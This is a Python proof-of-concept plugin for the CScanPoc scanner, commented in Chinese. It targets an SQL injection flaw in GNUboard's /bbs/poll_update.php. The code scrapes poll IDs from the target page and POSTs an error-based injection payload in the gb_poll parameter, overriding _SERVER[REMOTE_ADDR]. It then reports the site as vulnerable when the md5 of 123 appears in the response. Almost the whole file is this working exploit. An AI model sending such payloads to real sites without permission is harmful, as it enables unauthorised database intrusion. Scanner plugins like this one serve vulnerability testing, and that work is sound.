# coding: utf-8
import re

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'GNUboard_0101'  # 平台漏洞编号，留空
    name = 'GNUboard /bbs/poll_update.php SQL Injection'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-13'  # 漏洞公布时间
    desc = '''
    GNUboard 通用型注入SQL Injection，据测试基本上大部分的版本都可以。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'GNUboard'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7cee8c88-f4b4-4970-91d2-fce0c8167bda'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target
            req = requests.get(url)
            if req.status_code == 200:
                po_ids = re.findall(
                    r'name="po_id" value="(\\d+)"', req.text)
                for po_id in po_ids:
                    verify_url = url + '/poll_update.php'
                    post = ("_SERVER[REMOTE_ADDR]=86117&po_id=%s&gb_poll=1=1 and(select 1 from(select"
                            "count(*),concat((select md5(123)),floor(rand(0)*2))x from information_schema.tables group by"
                            "x)a)") % po_id
                    reqp = requests.post(verify_url, data=post)
                    if reqp.status_code == 200 and '202cb962ac59075b964b07152d234b70' in reqp.text:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
